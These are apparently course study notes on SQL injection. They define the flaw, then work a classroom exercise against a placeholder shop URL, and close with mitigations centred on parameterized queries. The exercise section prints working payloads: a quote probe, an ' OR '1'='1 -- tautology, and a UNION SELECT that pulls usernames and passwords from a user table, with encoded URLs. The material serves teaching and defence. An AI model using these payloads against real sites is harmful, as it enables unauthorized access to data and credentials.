
# SQL Injection (Slides 45–47) [[Q9]]

---

## 0. Clarification & Context
This document summarizes the key points from **Slides 45–47** on SQL Injection, then demonstrates how to exploit and bypass vulnerabilities using **Exercise 01** (product filtering by category). Examples refer to an e-commerce application that naively builds SQL queries from URL parameters.

---

## 1. Definition
- **SQL Injection** is a web-application vulnerability where user input is **directly concatenated** into SQL statements without a clear separation between **control instructions** (SQL keywords) and **data** (user-supplied values).
- This is not a flaw in the database system itself, but a defect in the server-side code that fails to validate, escape, or parameterize inputs.

---

## 2. Conditions for Vulnerability
1. **String-concatenation of inputs**: the application constructs queries like  
```text
   "... WHERE category = '" + userInput + "' ..."
```

2. **No input sanitization or escaping**: raw `userInput` is embedded unfiltered.
    
3. **Display of results or error messages**: database errors or returned rows are shown to the client, confirming injection success.
    

---

## 3. Attack Mechanism

1. **Locate injection point**: URL parameter, form field, HTTP header, etc.
    
2. **Test for vulnerability**:
    
    - Inject a single quote (`'`) → look for a SQL syntax error.
        
    - Inject a tautology (`' OR '1'='1`) → observe if more data appears.
        
3. **Exploit**:
    
    - **Bypass filters**: use `OR '1'='1' --` to force the WHERE clause to be always true and comment out the rest.
        
    - **Extract data**: use `UNION SELECT` to combine the original query’s results with data from other tables.
        
    - **Enumerate schema**: query metadata tables (e.g. `information_schema`).
        
4. **Analyze responses**: refine payloads based on returned data or error messages.
    

---

## 4. Exercise 01: Product Filtering by Category

### 4.1. Scenario

- **Initial URL**:
    
    ```
    https://insecure-website.com/products?category=Gifts
    ```
    
- **Server-side SQL**:
    
    ```sql
    SELECT id, nom, category, price
      FROM products
     WHERE category = '<userInput>'
       AND released = 1;
    ```
    
- **Goal**: demonstrate SQLi to
    
    1. Confirm the vulnerability
        
    2. Display all products
        
    3. Identify the injection type
        
    4. Extract data from the `user` table
        

---

### 4.2. Q1 – Confirming Vulnerability

- **Method**: induce a syntax error with an unmatched quote.
    
- **Payload**:
    
    ```
    category='
    ```
    
- **Test URL**:
    
    ```
    https://insecure-website.com/products?category=Gifts'
    ```
    
- **Expected outcome**: a database error (quoting mismatch) confirms unescaped input reaches the SQL engine.
    

---

### 4.3. Q2 – Displaying All Products

- **Objective**: bypass both the category filter and the `released = 1` check.
    
- **Technique**: tautology + comment.
    
- **Payload**:
    
    ```
    ' OR '1'='1 -- 
    ```
    
- **Encoded URL**:
    
    ```
    https://insecure-website.com/products?category=%27%20OR%20%271%27%3D%271%20--%20
    ```
    
- **Resulting SQL**:
    
    ```sql
    SELECT id, nom, category, price
      FROM products
     WHERE category = '' OR '1'='1' -- '
       AND released = 1;
    ```
    
- **Impact**: the WHERE clause always evaluates to true → all rows in `products` are returned.
    

---

### 4.4. Q3 – Injection Type

- **Observation**: the application returns query results directly in its HTTP response.
    
- **Conclusion**: this is **In-Band SQL Injection**—the attacker retrieves data via the same channel used to inject.
    

---

### 4.5. Q4 – Extracting the `user` Table

1. **Original query columns**: 4 (`id`, `nom`, `category`, `price`).
    
2. **Choose 4 columns from `user`**: e.g. `id`, `name`, `password`, `type_account`.
    
3. **Payload**:
    
    ```
    ' UNION SELECT id, name, password, type_account FROM user -- 
    ```
    
4. **Encoded URL**:
    
    ```
    https://insecure-website.com/products?category=%27%20UNION%20SELECT%20id%2C%20name%2C%20password%2C%20type_account%20FROM%20user%20--%20
    ```
    
5. **Combined SQL**:
    
    ```sql
    SELECT id, nom, category, price
      FROM products
     WHERE category = ''
    UNION
    SELECT id, name, password, type_account
      FROM user;  -- released = 1 is commented out
    ```
    
6. **Outcome**: the response will include rows from `user` in place of products, exposing usernames and passwords.
    

---

## 5. Mitigation & Best Practices

- **Use parameterized queries (prepared statements)** to enforce a strict separation between code and data.
    
- **Whitelist input validation**: reject any characters or patterns that do not conform to expected values.
    
- **Principle of least privilege**: limit the database account’s permissions to only what the application truly needs.
    
- **Regular security testing** (automated scans, code reviews, penetration tests).
    
- **Web Application Firewall (WAF)** as an additional layer, not a primary defense.
    

---

> **Opinion:** Relying on anything other than properly parameterized queries is a risky gamble. All other measures—firewalls, regex filters, manual sanitization—can be bypassed or misconfigured. The only reliable protection against SQLi is to treat user input strictly as data, never as executable SQL.



Tags: `#security` `#sql` `#web` `#injection` `#exercise`